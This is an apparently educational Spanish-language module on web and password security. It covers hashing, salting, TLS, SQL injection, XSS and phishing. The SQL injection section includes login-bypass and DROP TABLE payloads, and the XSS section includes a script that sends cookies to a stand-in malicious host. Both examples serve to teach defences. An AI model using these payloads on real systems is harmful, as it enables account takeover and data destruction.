# Ciberseguridad: Protegiendo tus Aplicaciones

¿Cómo sabe Facebook que eres tú cuando ingresas tu contraseña? ¿Cómo puede tu banco enviarte datos sensibles sin que nadie en el camino los lea? ¿Por qué un atacante puede vaciar cuentas bancarias con solo inyectar unas palabras en un formulario? En este módulo abandonamos la teoría abstracta y entramos al terreno donde el código mal escrito tiene consecuencias reales: datos robados, sistemas comprometidos, y vidas afectadas.

---

## 1. Contraseñas: Lo Que Hacemos Mal

Antes de hablar de técnicas, conviene entender el problema desde el lado humano.

Todos los años, investigadores de seguridad analizan bases de datos filtradas para identificar las contraseñas más comunes. Los resultados son consistentemente desalentadores:

| Posición | Contraseña |
|----------|------------|
| 1        | 123456     |
| 2        | 123456789  |
| 3        | 12345      |
| 4        | qwerty     |
| 5        | password   |
| 6        | 12345678   |
| 7        | 111111     |
| 8        | 123123     |
| 9        | 1234567890 |
| 10       | 1234567    |

Si tu contraseña está en esta lista, no eres el único: **millones de personas usan exactamente la misma**. Eso significa que cualquier atacante que tenga esta lista puede probar esas 10 contraseñas primero y tener alta probabilidad de éxito.

Tampoco son mucho mejores los trucos comunes: usar `3` en lugar de `E`, `@` en lugar de `A`, o agregar `!` al final. Los atacantes conocen esos patrones y los incorporan a sus herramientas automáticamente.

La realidad matemática es esta: **lo que hace segura una contraseña es la longitud y la aleatoriedad**, no los trucos mnemotécnicos.

---

## 2. Ataques de Fuerza Bruta: Los Números

Un **ataque de fuerza bruta** (*brute force attack*) consiste en probar sistemáticamente todas las combinaciones posibles hasta encontrar la correcta. Es el equivalente digital de probar cada llave en una cerradura.

¿Cuántas contraseñas posibles existen según sus características?

```
Código PIN de 4 dígitos:
  10⁴ = 10,000 posibilidades

Contraseña de 4 letras (solo minúsculas):
  26⁴ = 456,976 posibilidades

Contraseña de 4 caracteres (mayúsculas + minúsculas):
  52⁴ = 7,311,616 posibilidades

Contraseña de 4 caracteres (mayúsculas + minúsculas + dígitos + puntuación):
  94⁴ ≈ 78,074,896 posibilidades

Contraseña de 8 caracteres (todos los anteriores):
  94⁸ ≈ 6,095,689,385,410,816 posibilidades (6 cuatrillones)
```

Una computadora moderna puede probar **miles de millones de contraseñas por segundo** cuando ataca hashes almacenados offline. Una contraseña de 4 dígitos se rompe en menos de un segundo. Una contraseña de 8 caracteres aleatorios tardaría años en promedio.

### El efecto de las limitaciones de intentos

Una defensa sencilla pero efectiva: **limitar los intentos**. Si el sistema bloquea la cuenta después de 10 intentos fallidos y exige esperar un minuto, la velocidad del ataque baja de miles de millones por segundo a apenas 10 intentos por minuto. Eso convierte un ataque de segundos en uno de años.

Esta es la razón por la que tu teléfono se bloquea después de varios intentos fallidos y requiere tiempos de espera exponencialmente más largos.

### Autenticación de dos factores (2FA)

La **autenticación de dos factores** agrega una segunda capa de verificación:

1. **Algo que sabes:** tu contraseña
2. **Algo que tienes:** tu teléfono (que recibe un código de 6 dígitos por SMS o app)
3. *(Opcional)* **Algo que eres:** huella digital, Face ID

Con 2FA activo, un atacante que robe tu contraseña todavía no puede entrar sin acceso físico a tu dispositivo. Esto reduce enormemente la efectividad de los ataques remotos.

**Desventaja real:** Si pierdes tu teléfono o no tienes cobertura, puedes quedarte bloqueado de tu propia cuenta. Es el trade-off de toda medida de seguridad.

---

## 3. Hashing de Contraseñas: Nunca las Guardes en Texto Plano

Una aplicación web **nunca debe guardar contraseñas en texto plano** en su base de datos. Si alguien hackea tu base de datos, obtendrá directamente todas las contraseñas de todos tus usuarios.

La solución es el **hashing**: transformar la contraseña en una huella digital de longitud fija usando una función matemática de un solo sentido (no reversible).

```
Contraseña: "mi_contraseña_secreta"
         ↓ función de hash
Hash:     "5d41402abc4b2a76b9719d911017c592"
```

La propiedad clave: dado el hash, es computacionalmente inviable reconstruir la contraseña original (para hashes bien diseñados).

Cuando el usuario ingresa su contraseña:
1. El servidor calcula el hash de lo que el usuario escribió.
2. Compara ese hash con el hash almacenado.
3. Si coinciden, la contraseña es correcta.
4. El servidor nunca necesita guardar ni comparar la contraseña en texto plano.

### MD5: Un hash roto (no uses esto)

**MD5** fue un estándar en los años 90. Produce un hash de 128 bits (32 caracteres hexadecimales). El problema: es extremadamente rápido.

```python
import hashlib
hashlib.md5(b"password").hexdigest()
# "5f4dcc3b5aa765d61d8327deb882cf99"
```

La velocidad es un problema de seguridad: una GPU moderna puede calcular **miles de millones de hashes MD5 por segundo**. Eso hace que los ataques de fuerza bruta sean triviales incluso para contraseñas largas.

Además, MD5 tiene colisiones conocidas (dos entradas diferentes que producen el mismo hash), lo que lo invalida para cualquier propósito criptográfico.

**MD5 no debe usarse para contraseñas. Nunca.**

### SHA-256: Mejor, pero todavía insuficiente para contraseñas

**SHA-256** (parte de la familia SHA-2) produce un hash de 256 bits y es criptográficamente seguro: no tiene colisiones conocidas y es resistente a la inversión.

```python
import hashlib
hashlib.sha256(b"password").hexdigest()
# "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8"
```

El problema: también es muy rápido. Una GPU moderna puede calcular miles de millones de hashes SHA-256 por segundo. Para contraseñas, la velocidad sigue siendo el enemigo.

SHA-256 es excelente para verificar integridad de archivos, firmas digitales y certificados. Para contraseñas, necesitas algo más.

### bcrypt: El estándar correcto para contraseñas

**bcrypt** fue diseñado específicamente para almacenar contraseñas. Tiene dos características que lo hacen ideal:

1. **Lentitud intencional:** bcrypt tiene un parámetro llamado *cost factor* (o *work factor*) que controla cuánto trabajo computacional requiere calcular un hash. Se diseña para tardar aproximadamente **100 milisegundos**, no microsegundos.

2. **Salt incorporado:** bcrypt genera e incorpora automáticamente un *salt* (valor aleatorio) en cada hash. Esto previene los ataques con tablas precomputadas.

```python
import bcrypt

# Hashear una contraseña
password = b"mi_contraseña_secreta"
salt = bcrypt.gensalt(rounds=12)  # cost factor 12 ≈ 2^12 iteraciones
hash = bcrypt.hashpw(password, salt)
# b"$2b$12$EixZaYVK1fsbw1ZfbX3OXePaWxn96p36WQoeG6Lruj3vjPGga31lW"

# Verificar
bcrypt.checkpw(b"mi_contraseña_secreta", hash)  # True
bcrypt.checkpw(b"contraseña_incorrecta", hash)  # False
```

El hash de bcrypt incluye el salt dentro de sí mismo, por lo que no necesitas guardarlo por separado.

**¿Por qué la lentitud es una ventaja?**
Para un usuario legítimo que inicia sesión, 100ms es imperceptible.
Para un atacante que intenta millones de contraseñas por segundo, 100ms por intento significa solo 10 intentos por segundo. La misma GPU que probaba miles de millones de hashes SHA-256 por segundo ahora solo puede probar unos pocos miles de bcrypt por segundo.

Otras alternativas modernas igualmente válidas: **Argon2** (ganador del Password Hashing Competition de 2015, recomendado en nuevos proyectos) y **scrypt**.

---

## 4. Salting: Derrotando las Tablas Arcoíris

Incluso con SHA-256, existe un ataque eficiente llamado **tabla arcoíris** (*rainbow table*): una base de datos precomputada que mapea millones de contraseñas comunes a sus hashes.

```
Hash SHA-256 de "password" → siempre produce el mismo resultado
5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8

Si este hash aparece en tu base de datos, el atacante sabe
inmediatamente que la contraseña es "password"
```

La solución es el **salt**: un valor aleatorio único que se genera por usuario y se concatena con la contraseña antes de hashearla.

```
Sin salt:
hash("password") = 5e884898...  ← siempre igual

Con salt aleatorio:
salt = "xK7a2mP9"
hash("password" + "xK7a2mP9") = f3a7b91c...  ← único para este usuario

Si otro usuario también usa "password":
salt = "qR5n8vL2"  ← diferente salt
hash("password" + "qR5n8vL2") = 2d8c4a1b...  ← hash diferente
```

Con salting:
- El mismo password produce hashes diferentes para cada usuario
- Las tablas arcoíris precomputadas son inútiles (tendrían que recomputarse para cada salt)
- Si el atacante tiene la base de datos, tiene que hacer fuerza bruta para cada usuario individualmente

**El salt no es secreto:** se guarda junto al hash en la base de datos. Su valor viene de la unicidad por usuario, no del secreto.

---

## 5. HTTPS y TLS: El Candado del Navegador

Cuando visitas `https://www.tubancoejemplo.com`, ese `https` no es decorativo. Indica que la conexión usa **TLS** (*Transport Layer Security*), el protocolo que encripta los datos mientras viajan entre tu navegador y el servidor.

Sin HTTPS, todo lo que envías y recibes viaja en texto plano por la red. Cualquier dispositivo en el camino —un router en una cafetería, tu proveedor de internet, un servidor intermediario— puede leer exactamente qué datos estás enviando.

```
Sin HTTPS:
Tu laptop → [router cafetería] → [ISP] → [servidor] → respuesta
            ↑ todos pueden leer tu número de tarjeta

Con HTTPS:
Tu laptop → [router cafetería] → [ISP] → [servidor]
            ↑ ven datos cifrados ininteligibles
```

### Cómo funciona TLS (simplificado)

TLS usa **criptografía asimétrica** para establecer una conexión segura:

1. **Handshake:** Tu navegador y el servidor negocian qué algoritmos usar y el servidor envía su **certificado digital** (emitido por una autoridad de certificación de confianza).

2. **Verificación:** Tu navegador verifica que el certificado sea legítimo y que corresponda al dominio que estás visitando. Si no coincide, ves el aviso de "conexión no segura".

3. **Intercambio de clave:** Usando la clave pública del certificado, tu navegador y el servidor acuerdan en secreto una clave simétrica temporal.

4. **Comunicación cifrada:** A partir de ese momento, toda la comunicación va cifrada con esa clave simétrica temporal, que solo tu navegador y el servidor conocen.

### HTTPS vs. Cifrado extremo a extremo

Es importante distinguir:

- **HTTPS** cifra la comunicación entre tú y el **servidor**. El servidor puede leer todos tus datos.
- **Cifrado extremo a extremo** (como en Signal o iMessage) cifra la comunicación entre tú y el **destinatario final**. Ni siquiera el proveedor del servicio puede leer los mensajes.

Cuando usas WhatsApp en modo normal, Meta puede técnicamente acceder a tus mensajes. Cuando activas "chats cifrados de extremo a extremo", solo tú y el destinatario tienen las claves.

### ¿Qué NO protege HTTPS?

- No oculta a **qué dominio** te conectas (aunque sí oculta las URLs específicas y el contenido)
- No te protege si el **servidor** es malicioso o está comprometido
- No te protege del **malware** en tu propio dispositivo
- No es lo mismo que privacidad total: tu ISP sabe que visitas ciertos dominios

---

## 6. SQL Injection: Cuando el Input se Convierte en Código

La **inyección SQL** (*SQL injection*) es una de las vulnerabilidades más antiguas y más persistentes en aplicaciones web. Aparece cuando una aplicación construye consultas SQL concatenando directamente el input del usuario sin sanitizarlo.

### El ataque explicado

Imagina un formulario de inicio de sesión. El código del servidor hace algo así:

```python
# CÓDIGO VULNERABLE — NUNCA hagas esto
username = input_del_formulario["username"]  # "admin"
password = input_del_formulario["password"]  # "12345"

query = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'"
# Resultado: SELECT * FROM users WHERE username='admin' AND password='12345'
```

Un usuario normal produce una consulta válida. Pero un atacante puede escribir como username:

```
' OR '1'='1
```

Y la consulta resultante sería:

```sql
SELECT * FROM users WHERE username='' OR '1'='1' AND password='...'
```

Como `'1'='1'` siempre es verdadero, esta consulta devuelve **todos los usuarios de la base de datos** sin necesidad de conocer ninguna contraseña.

Variante más destructiva: si el atacante escribe como username:

```
'; DROP TABLE users; --
```

La consulta resultante sería:

```sql
SELECT * FROM users WHERE username=''; DROP TABLE users; --' AND password='...'
```

Esto **elimina la tabla de usuarios completa**. El `--` comenta el resto de la consulta para evitar errores de sintaxis.

### Caso real: Filtración de datos de Movistar Argentina (2021)

En 2021, datos de aproximadamente **100,000 empleados y clientes de Movistar Argentina** fueron expuestos en foros de hackers. La filtración se atribuyó parcialmente a vulnerabilidades de inyección SQL en aplicaciones internas. Nombres, números de documento, correos electrónicos y salarios quedaron expuestos públicamente.

Este tipo de incidentes se repite constantemente en América Latina, donde muchas aplicaciones empresariales fueron construidas hace años sin las mejores prácticas actuales de seguridad.

### Cómo prevenir SQL Injection: Consultas preparadas

La solución es simple y definitiva: **nunca concatenes input del usuario en una consulta SQL**. Usa **consultas preparadas** (*prepared statements* o *parameterized queries*):

```python
# CÓDIGO SEGURO con sqlite3 en Python
import sqlite3

conn = sqlite3.connect("database.db")
cursor = conn.cursor()

username = input_del_formulario["username"]
password = input_del_formulario["password"]

# Los ? son marcadores de posición — el driver maneja el escape
cursor.execute(
    "SELECT * FROM users WHERE username = ? AND password = ?",
    (username, password)
)
result = cursor.fetchone()
```

Con consultas preparadas, el input del usuario nunca se interpreta como código SQL. Si alguien escribe `' OR '1'='1`, el sistema lo trata como una cadena de texto literal, no como SQL.

```python
# En Flask con SQLAlchemy (más idiomático para web apps)
from flask_sqlalchemy import SQLAlchemy

# El ORM genera automáticamente consultas parametrizadas
user = User.query.filter_by(username=username, password_hash=hashed_pw).first()
```

**Regla de oro:** Si alguna vez te encuentras construyendo una consulta SQL con concatenación de strings, detente. Hay casi siempre una forma mejor y segura.

---

## 7. Cross-Site Scripting (XSS)

El **Cross-Site Scripting** (XSS) ocurre cuando una aplicación incluye en sus páginas HTML datos no saneados del usuario, permitiendo que un atacante inyecte código JavaScript que se ejecuta en el navegador de otros usuarios.

### El ataque explicado

Imagina un foro donde los usuarios pueden publicar comentarios. Si el servidor no sanea el input, un atacante puede publicar como "comentario":

```html
<script>
  // Este script se ejecutará en el navegador de cualquier persona
  // que visite la página con este comentario
  document.location = 'https://sitio-malicioso.com/robar?cookie=' + document.cookie;
</script>
```

Cuando otro usuario visita esa página, el script se ejecuta en **su** navegador, enviando sus cookies de sesión al atacante. Con esas cookies, el atacante puede suplantar la identidad de la víctima sin necesitar su contraseña.

### Tipos de XSS

**XSS reflejado (reflected XSS):** El payload malicioso está en la URL y se "refleja" inmediatamente en la respuesta. El atacante necesita engañar a la víctima para que haga clic en una URL especialmente construida.

```
https://tienda-ejemplo.com/buscar?q=<script>robar_cookies()</script>
```

**XSS almacenado (stored XSS):** El más peligroso. El payload malicioso se guarda en la base de datos y afecta a **todos** los usuarios que visiten la página. El comentario del ejemplo anterior es de este tipo.

**XSS basado en DOM:** El ataque ocurre enteramente en el cliente, manipulando el DOM sin que el servidor esté involucrado.

### Caso real: British Airways (2018)

En 2018, un ataque de XSS sofisticado contra el sitio web de British Airways comprometió los datos de pago de **380,000 clientes**. Los atacantes inyectaron un script malicioso que capturaba en tiempo real los datos de tarjetas de crédito mientras los usuarios los introducían. La aerolínea fue multada con £20 millones bajo el GDPR europeo.

### Cómo prevenir XSS: Escapar el output

La defensa principal es **escapar todos los datos antes de renderizarlos en HTML**. Escapar significa convertir caracteres especiales HTML en sus entidades correspondientes:

```
<  →  &lt;
>  →  &gt;
"  →  &quot;
'  →  &#x27;
&  →  &amp;
```

De esta manera, si un atacante escribe `<script>alert('xss')</script>`, el servidor lo convierte a:

```html
&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;
```

Que el navegador muestra como texto literal, no como código ejecutable.

En Flask con Jinja2, el escapado es automático en las plantillas:

```html
<!-- Jinja2 escapa automáticamente con {{ }} -->
<p>Comentario: {{ comentario_del_usuario }}</p>

<!-- Si QUIERES renderizar HTML (solo con contenido de confianza) usa | safe -->
<p>{{ contenido_administrativo | safe }}</p>
```

Otras defensas complementarias:

- **Content Security Policy (CSP):** Header HTTP que restringe qué scripts pueden ejecutarse
- **Cookies con flag `HttpOnly`:** Evita que JavaScript acceda a las cookies de sesión
- **Cookies con flag `Secure`:** Solo se envían por HTTPS

---

## 8. Phishing e Ingeniería Social

No todos los ataques aprovechan vulnerabilidades técnicas. Muchos de los ataques más efectivos explotan **vulnerabilidades humanas**: la confianza, el miedo, la urgencia, y el deseo de ayudar.

**Phishing** es el conjunto de técnicas para engañar a personas para que revelen información confidencial o realicen acciones perjudiciales. Es la puerta de entrada más común a sistemas supuestamente seguros.

### Técnicas comunes

**Email de phishing:** Un correo que parece venir de tu banco, de Amazon, de tu empresa, o de una institución gubernamental. El diseño es casi idéntico al original. El link lleva a una página falsa que roba tus credenciales.

**Spear phishing:** Phishing dirigido a una persona específica, usando información personal recopilada de redes sociales y otras fuentes para hacer el ataque más convincente. "Hola Juan, vi en LinkedIn que trabajas en ACME Corp..."

**Smishing:** Phishing por SMS. "Su paquete está detenido en aduana. Haga clic aquí para liberar: [link malicioso]"

**Vishing:** Phishing por llamada telefónica. "Soy del departamento de seguridad de su banco. Hemos detectado movimientos sospechosos..."

**CEO fraud / BEC (Business Email Compromise):** El atacante se hace pasar por un ejecutivo de la empresa por email. "Soy el director general. Necesito que hagas una transferencia urgente y confidencial a esta cuenta..."

### Caso real: Ataque a Banco de Chile (2018)

En mayo de 2018, el Banco de Chile sufrió uno de los ataques más sofisticados de América Latina. Los atacantes enviaron correos de phishing a empleados del banco para instalar malware. Este malware saboteó miles de computadoras con un virus llamado KillMBR (que destruía los registros de arranque), creando una distracción masiva. Mientras el personal de TI estaba ocupado apagando el incendio digital, los atacantes usaron acceso al sistema SWIFT (el sistema internacional de transferencias bancarias) para robar **10 millones de dólares**, que fueron transferidos a cuentas en Hong Kong.

El ataque combinó phishing, malware, ingeniería social e ingeniería de distracción. La mayor parte del dinero no fue recuperada.

### Cómo reconocer un intento de phishing

Señales de alerta:

1. **Urgencia artificial:** "Su cuenta será suspendida en 24 horas si no..."
2. **URL sospechosa:** `www.bancosantander-seguro.net` en lugar de `www.bancosantander.cl`
3. **Dominio de email incorrecto:** correo de `soporte@banco-chile.net` en lugar de `@bancochile.cl`
4. **Solicitudes inusuales:** Ningún banco legítimo te pedirá tu contraseña por email o teléfono.
5. **Archivos adjuntos inesperados:** especialmente `.exe`, `.zip`, `.docm` con macros.
6. **Errores gramaticales y de formato:** aunque los ataques sofisticados modernos son gramaticalmente perfectos.

### Ingeniería social más allá del phishing

La ingeniería social abarca cualquier manipulación psicológica para obtener acceso no autorizado:

- **Pretexting:** Crear una historia falsa para obtener información. "Soy del área de IT, necesito tu contraseña para migrar tu cuenta"
- **Baiting:** Dejar una USB con malware en el estacionamiento de una empresa, esperando que alguien la encuentre y la conecte por curiosidad
- **Tailgating:** Entrar físicamente a instalaciones restringidas siguiendo a alguien con acceso autorizado

La mejor defensa técnica no sirve de nada si un empleado revela sus credenciales por teléfono.

---

## 9. Buenas Prácticas: Tu Lista de Acción

### Para usuarios

- **Usa un gestor de contraseñas** (Bitwarden, 1Password, el que viene integrado en tu sistema operativo). Genera contraseñas únicas y largas para cada servicio.
- **Activa 2FA** en todas las cuentas importantes: email, banco, redes sociales.
- **Desconfía de la urgencia.** Los atacantes crean urgencia artificial para evitar que pienses con calma.
- **Verifica las URLs** antes de ingresar credenciales. Busca el candado y el dominio correcto.
- **No reutilices contraseñas.** Una filtración en un sitio no importante no debe comprometer tu banco.
- **Mantén actualizado** tu sistema operativo y aplicaciones. Las actualizaciones de seguridad corrigen vulnerabilidades conocidas.

### Para desarrolladores

- **Nunca guardes contraseñas en texto plano.** Usa bcrypt o Argon2.
- **Usa consultas preparadas** para toda interacción con bases de datos.
- **Escapa el output** antes de renderizarlo en HTML.
- **Usa HTTPS siempre.** Certbot/Let's Encrypt lo hace gratis y automático.
- **Implementa CSP** para proteger contra XSS.
- **Aplica el principio de mínimo privilegio:** cada componente de tu sistema solo debe tener acceso a lo que necesita.
- **Valida en el servidor.** La validación del lado del cliente (JavaScript) es solo para mejorar la experiencia del usuario; nunca confíes en ella para la seguridad.
- **Registra los intentos fallidos de autenticación** y alerta si detectas patrones anómalos.
- **Nunca pongas credenciales en el código fuente** ni en repositorios de Git. Usa variables de entorno.

---

## 10. El Marco Mental: Seguridad como Trade-off

La ciberseguridad nunca es absoluta. Cada medida de seguridad tiene un costo:

| Medida | Beneficio | Costo |
|--------|-----------|-------|
| Contraseña más larga | Más difícil de adivinar | Más difícil de recordar |
| 2FA | Requiere acceso físico al segundo factor | Inconveniente si no tienes el dispositivo |
| Sesiones que expiran rápido | Reduce la ventana de ataque | El usuario tiene que volver a iniciar sesión |
| Cifrado de disco completo | Datos ilegibles si roban el dispositivo | Pequeño impacto en rendimiento |

La pregunta no es "¿somos seguros?" sino "¿somos lo suficientemente seguros para nuestro modelo de amenazas?" Un sitio web personal no necesita la misma seguridad que un sistema bancario.

Lo que sí es universal: **la seguridad por oscuridad no funciona**. Esconder cómo funciona tu sistema no lo hace seguro. Los sistemas más seguros del mundo (como Linux, TLS, bcrypt) son de código abierto y sus algoritmos son públicos. Su seguridad viene de la solidez matemática, no del secreto.

---

## Resumen

| Amenaza | Qué es | Cómo defenderse |
|---------|--------|-----------------|
| **Contraseñas débiles** | Contraseñas predecibles o cortas | Usar contraseñas largas y aleatorias; gestores de contraseñas |
| **Fuerza bruta** | Probar todas las combinaciones posibles | Limitar intentos; contraseñas largas; bcrypt |
| **Hashing inseguro** | MD5/SHA-256 sin salt son insuficientes para contraseñas | Usar bcrypt o Argon2 con salt |
| **Sin HTTPS** | Datos viajando en texto plano | Certificados TLS (Let's Encrypt es gratis) |
| **SQL Injection** | Input del usuario interpretado como SQL | Consultas preparadas; ORMs |
| **XSS** | Scripts maliciosos inyectados en páginas | Escapar output; Content Security Policy |
| **Phishing** | Engaño para revelar credenciales | Educación; 2FA; verificar URLs |
| **Ingeniería social** | Manipulación psicológica | Protocolos de verificación; cultura de seguridad |
